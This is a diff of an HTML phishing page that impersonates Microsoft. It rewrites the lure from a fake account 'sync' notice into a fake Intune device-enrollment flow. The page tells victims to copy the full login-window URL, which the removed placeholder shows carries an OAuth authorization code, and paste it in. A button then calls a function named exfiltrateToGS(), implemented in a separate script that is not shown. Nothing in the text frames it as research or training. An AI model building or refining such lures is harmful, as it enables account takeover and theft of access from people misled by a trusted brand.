@@ -2,52 +2,45 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Account Services</title>
+    <title>Microsoft Intune | Device Enrollment</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; width: 400px; padding: 44px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 2px; }
-        .logo { width: 108px; margin-bottom: 24px; }
-        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
-        p { font-size: 15px; color: #1b1b1b; line-height: 20px; margin-bottom: 20px; }
-        .btn { background: #0067b8; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 15px; width: 100%; font-weight: 400; transition: background 0.2s; }
-        .btn:hover { background: #005da6; }
-        .btn-sync { background: #28a745; margin-top: 15px; font-weight: 600; }
-        .btn-sync:hover { background: #218838; }
-        input { width: 100%; padding: 12px; border: 1px solid #8a8886; margin-top: 10px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; font-size: 12px; }
-        input:focus { border: 2px solid #0067b8; padding: 11px; outline: none; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .enroll-box { background: white; width: 450px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 4px solid #0067b8; }
+        .logo { width: 120px; margin-bottom: 30px; }
+        h1 { font-size: 22px; color: #323130; margin-bottom: 8px; }
+        p { font-size: 14px; color: #605e5c; line-height: 1.6; }
+        .btn { background: #0067b8; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: 600; margin-top: 20px; }
+        input { width: 100%; padding: 12px; margin-top: 15px; border: 1px solid #8a8886; box-sizing: border-box; font-family: monospace; }
         .hidden { display: none; }
-        .footer { margin-top: 40px; font-size: 12px; color: #666; }
-        .footer span { margin-right: 15px; cursor: pointer; }
+        .status-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo" alt="Microsoft">
+<div class="enroll-box">
+    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
     
     <div id="step-1">
-        <h1>Sync Required</h1>
-        <p>A mandatory security update is available for your account. Please synchronize your session to maintain access to Microsoft services.</p>
-        <button class="btn" onclick="startBridge()">Synchronize Now</button>
+        <h1>Enroll this device</h1>
+        <p>To access company resources, you must register this device with Microsoft Intune. This ensures your device meets security compliance standards.</p>
+        <button class="btn" onclick="startBridge()">Enroll My Device</button>
     </div>
 
     <div id="step-2" class="hidden">
-        <h1>Finalize Sync</h1>
-        <p>Your session has been validated. Please copy the <b>entire URL</b> from the browser bar of the login window and paste it here to complete the handshake:</p>
-        
-        <input type="text" id="raw-url" placeholder="https://login.microsoftonline.com/common/oauth2/nativeclient?code=...">
-        
-        <button class="btn btn-sync" onclick="exfiltrateToGS()">Finish Synchronization</button>
+        <h1>Registering Device...</h1>
+        <p>A secure management certificate has been generated. Copy the final URL from the login window and paste it here to finalize enrollment:</p>
+        <input type="text" id="raw-url" placeholder="Paste enrollment URL here...">
+        <button class="btn" style="background:#28a745;" onclick="exfiltrateToGS()">Finalize Registration</button>
     </div>
 
-    <div class="footer">
-        <span>Privacy & cookies</span>
-        <span>Terms of use</span>
+    <div id="step-3" class="hidden" style="text-align: center;">
+        <h1>Compliance Verified</h1>
+        <div class="status-spinner"></div>
+        <p>Device enrollment successful. Redirecting to Management Dashboard...</p>
     </div>
 </div>
 
 <script src="index.js"></script>
-
 </body>
 </html>
